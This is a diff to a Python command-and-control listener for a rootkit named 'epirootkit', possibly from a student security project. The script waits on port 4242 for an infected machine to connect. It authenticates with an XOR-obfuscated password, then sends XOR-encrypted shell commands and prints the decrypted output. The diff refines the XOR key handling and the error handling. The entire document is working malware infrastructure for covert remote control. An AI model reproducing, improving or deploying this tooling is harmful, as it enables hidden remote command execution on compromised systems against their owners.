@@ -1,21 +1,25 @@
 import socket
+import sys
 
-# Correction de la clé XOR pour correspondre au rootkit
-KEY = b"epirootkit"
+# Make sure to use string key, not bytes, to match the rootkit
+KEY = "epirootkit"
 HOST = "0.0.0.0"
 PORT = 4242
 
 def xor(data: bytes) -> bytes:
-    key_bytes = KEY
+    """
+    Implements the same XOR logic as the rootkit:
+    decrypted[i] = buffer[i] ^ config.xor_key[i % strlen(config.xor_key)]
+    """
     result = bytearray()
     for i, b in enumerate(data):
-        result.append(b ^ key_bytes[i % len(key_bytes)])
+        result.append(b ^ ord(KEY[i % len(KEY)]))
     return bytes(result)
 
 def handle_client(client):
     try:
         # Envoyer le mot de passe chiffré
-        password = b"epirootkit\n"  # Le \n est important pour correspondre au module kernel
+        password = b"epirootkit\n"
         encrypted_pass = xor(password)
         client.sendall(encrypted_pass)
 
@@ -25,7 +29,13 @@ def handle_client(client):
             print("No response received")
             return
 
-        auth_response = xor(auth_response_encrypted).decode('ascii', errors="ignore")
+        auth_response = xor(auth_response_encrypted)
+        try:
+            auth_response = auth_response.decode('ascii')
+        except UnicodeDecodeError:
+            print("Warning: Received corrupted response")
+            auth_response = auth_response.decode('ascii', errors='ignore')
+
         print("--- AUTH ---")
         print(auth_response.strip())
         print("------------\n")
@@ -44,14 +54,21 @@ def handle_client(client):
                     break
 
                 # Chiffrer et envoyer la commande
-                encrypted_cmd = xor(cmd.encode() + b"\n")
+                cmd_bytes = (cmd + "\n").encode('ascii')
+                encrypted_cmd = xor(cmd_bytes)
                 client.sendall(encrypted_cmd)
 
                 # Recevoir et déchiffrer la réponse
                 response_encrypted = client.recv(2048)
                 if response_encrypted:
-                    response = xor(response_encrypted).decode('ascii', errors="ignore")
-                    print(response.strip())
+                    response = xor(response_encrypted)
+                    try:
+                        response = response.decode('ascii')
+                        print(response.strip())
+                    except UnicodeDecodeError:
+                        print("Warning: Received corrupted response")
+                        response = response.decode('ascii', errors='ignore')
+                        print(response.strip())
 
             except KeyboardInterrupt:
                 break
